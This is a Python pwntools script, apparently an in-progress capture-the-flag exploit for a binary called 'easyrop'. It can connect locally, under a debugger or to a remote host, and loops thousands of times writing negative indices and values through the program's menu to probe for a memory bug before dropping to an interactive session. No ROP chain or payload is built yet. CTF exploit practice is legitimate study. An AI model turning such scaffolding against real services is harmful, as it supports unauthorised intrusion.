#!/usr/bin/env python3

from pwn import *

elf = ELF("./easyrop")
libc = elf.libc

context.binary = elf
context.log_level = "debug"

gdbscript='''
'''

def conn(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([elf.path] + argv, *a, **kw)

def write(r,idx,num):
    r.sendline(str(1)) 
    r.sendlineafter(b"Select index: ",str(idx))
    r.sendlineafter(b"number to write: ",str(num),timeout=2)
 

def read(r,idx):
    r.sendlineafter(b"write and '2' to read!\n",str(2))
    r.sendlineafter(b"Select index: ",str(idx))
    r.recv()
    

def main():
    r = conn()
    idx = 2
    num = -1000000
    r.recvuntil(b"and '2' to read!\n",timeout=2)
    for i in range(5000):
        write(r,idx,num)
        read(r,idx)
        num += -100 

    r.interactive()


if __name__ == "__main__":
    main()

